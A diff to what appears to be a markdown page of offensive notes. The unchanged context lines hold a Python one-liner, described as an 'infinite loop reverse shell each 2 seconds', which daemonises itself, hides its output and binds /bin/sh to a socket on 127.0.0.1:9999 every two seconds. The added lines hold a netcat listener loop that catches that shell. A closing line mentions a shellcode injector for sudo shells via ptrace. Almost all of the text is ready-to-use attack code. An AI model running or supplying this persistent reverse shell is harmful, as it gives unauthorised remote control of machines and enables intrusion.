@@ -12,6 +12,10 @@ Infinite loop reverse shell each 2 seconds:
  python -c 'exec("""\nimport socket,subprocess,os,sys, time\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\nos.setsid()\nos.umask(0)\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nwhile 1:\n        try:\n                sys.stdout.flush()\n\n                sys.stderr.flush()\n\n                fdreg = open("/dev/null", "w")\n\n                sys.stdout = fdreg\n\n                sys.stderr = fdreg\n\n                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n                sdregs.connect(("127.0.0.1",9999))\n\n                os.dup2(sdregs.fileno(),0)\n\n                os.dup2(sdregs.fileno(),1)\n\n                os.dup2(sdregs.fileno(),2)\n\n                p=subprocess.call(["/bin/sh","-i"])\n\n                sdregs.close()\n\n        except Exception:\n                pass\n\n        time.sleep(2)\n""")'
 ```
 
+Just wait for reverse shell with a nc
+```
+while true; do nc -lvp 9999; done
+```
 
 I made this for my shellcode injector in sudo shells via ptrace:
 
